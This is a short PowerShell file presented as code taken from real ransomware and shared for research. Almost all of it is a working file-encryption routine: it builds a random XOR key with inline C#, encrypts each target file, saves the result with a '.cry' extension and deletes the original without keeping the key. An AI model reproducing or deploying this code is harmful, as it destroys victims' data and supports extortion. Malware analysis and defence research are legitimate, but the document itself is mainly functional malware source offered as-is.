// THIS CODE SAMPLE WAS TAKEN FROM REAL RANSOMWARE AND IS PROVIDED HERE ONLY FOR RESEARCH NEEDS !!!
// TO STOP RANSOMWARE WE NEED TO KNOW HOW IT WORKS INSIDE
// DON'T USE ANY OF THIS CODE SAMPLES FOR ANY CRIMINAL ACTIVITIES!

$myxorstr = 'add-type -language csharp -typedefinition @"'+[char]10+'using System;'+[char]10+'public class myxor {'+[char]10+'public static byte[] myxorfunc(byte[] ar1, byte[] ar2) {'+[char]10+'int j=0;for(int i=0;i<ar1.Length;i++) {ar1[i] ^= ar2[j];if(j+1 < ar2.Length) {j++;} else {j=0;} }return ar1;}'+[char]10+'public static byte[] myrandfunc(byte[] k, int len) {var r=new Random();for(int i=0;i<len;i++) {k[i] = Convert.ToByte(r.Next(256));}'+[char]10+'return k;'+[char]10+'}}'+[char]10+'"@'+[char]10+'New-Object myxor;';
 
function GetRandBytesSeq($seqlen) {
$seq = new-object byte[] $seqlen;
$mxr = new-object(iex $myxorstr);
$seq = $mxr::myrandfunc($seq,$seqlen);
return $seq;
}

function EncryptFile($filepath) {
try {
$file = [io.file]::ReadAllBytes($filepath);
$filekey = GetRandBytesSeq(4096);
$filecrypted = new-object byte[] $file.length;
$mxr = new-object(iex $myxorstr);
$filecrypted = $mxr::myxorfunc($file,$filekey);
$filecrypted = $filecrypted;
sc -path $filepath'.cry' -value $filecrypted -Encoding byte;
remove-item -path $filepath;
} catch {
}
}

